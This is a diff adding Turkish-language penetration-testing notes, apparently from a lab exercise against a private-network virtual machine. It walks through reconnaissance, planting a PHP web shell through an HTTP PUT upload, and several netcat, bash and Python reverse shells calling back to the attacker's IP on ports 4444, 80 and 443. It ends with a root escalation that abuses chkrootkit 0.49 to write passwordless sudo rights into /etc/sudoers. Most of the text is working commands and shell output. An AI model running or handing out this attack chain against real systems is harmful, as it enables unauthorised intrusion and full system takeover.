@@ -1,0 +1,100 @@
+192.168.189.131 hedef ip
+128 bnm ip
+nmap -Pn -f -sV 192.168.189.131
+nikto -h 192.168.189.131
+dirb http://192.168.189.131
+curl -v -X OPTIONS http://192.168.189.131/test  
+^ PUT methodu izinliyse patlatiyoruz
+curl -v -X PUT -d 'deneme' http://192.168.189.131/test/deneme.txt
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://192.168.189.131/test/shell.php
+tarayicidan http://192.168.189.131/test/shell.php?cmd=ls
+http://192.168.189.131/test/shell.php?cmd=whoami
+nc net cad var mi ? tarayiciya http://192.168.189.131/test/shell.php?cmd=which%20nc
+/bin/nc cevabi geliyor bunu kullanioruz reverse shell icin
+tarayiciya http://192.168.189.131/test/shell.php?cmd=/bin/nc -vv 192.168.189.128 4444 -e /bin/bash
+^4444 dinleme portumuz ip ise bizim ipmiz
+tarayiciya http://192.168.189.131/test/shell.php?cmd=nc -vv 192.168.189.128 4444 -e /bin/bash
+^4444 dinleme portumuz ip ise bizim ipmiz
+netcad yemedi
+pentestmonkeye gittik
+http://192.168.189.131/test/shell.php?cmd=uname -a    hedefin isletim sistemi
+
+shell alma ;
+dinlemeye aliyoruz nc -lvp 4444
+
+bash -i >& /dev/tcp/192.168.189.128/4444 0>&1
+buda is gormedi
+portlardan cikis engellenmis olabilir python deniyoruz
+
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.189.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+port engelli gibi duruyor port 80 i deniyoruz
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.189.128",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+buda yemedi 
+sira 443 de
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.189.128",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+buda olmazsa 1000 i deneyecez ama baska shell turuyle reverse degil bind shell yada wind
+443 oldu
+low shell olarak makineyi ele gecirdik yetki yukseltmeye geldi sira
+ilk bakmamiz gereken root yetkisiyle suitbit yani root yetkisi ile calisan programlar
+yada crometab schullde zamanlanmis programlar ile zaafiyet yakalanabilir.
+
+
+
+www-data@ubuntu:/$ cd root
+cd root
+bash: cd: root: Permission denied
+www-data@ubuntu:/$ locate cron
+cat standard
+chkrootkit  belgesi zaafiyetli uygulamadir.
+
+www-data@ubuntu:/etc/cron.daily$ chkrootkit -V
+chkrootkit -V
+chkrootkit version 0.49  google dan nasil bu zaaftan faydalaniriz onu goruyoruz
+ardindan gerekenleri yapiyoruz
+
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' >> /tmp/update
+
+once etc sudoers dosyasinin yetkisini 777 yap ardindan icine bunu yaz www-data ALL=NOPASSWD:ALL  www-data kullanicisini tam yetkili yap pass sorma  etc sudorsun
+yetkisini eski haline cevir yani 440 yap
+
+
+www-data@ubuntu:/etc/cron.daily$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' >> /tmp/update
+< ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' >> /tmp/update
+www-data@ubuntu:/etc/cron.daily$ cd /tmp
+cd /tmp
+www-data@ubuntu:/tmp$ ls
+ls
+VMwareDnD  php.socket-0  update  vgauthsvclog.txt.0  vmware-root
+www-data@ubuntu:/tmp$ cat update
+cat update
+chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers
+www-data@ubuntu:/tmp$
+
+ardindan tmp icine ls -lah ile yetkilere bakip update in yazilabilir silinebilir butun yetkilerini vericezz
+dosya executable deil bu yuzden 
+
+chmod 777 update
+
+sudo su diyerek root oluyoruz ... bukadar
+
+www-data@ubuntu:/tmp$ sudo su
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
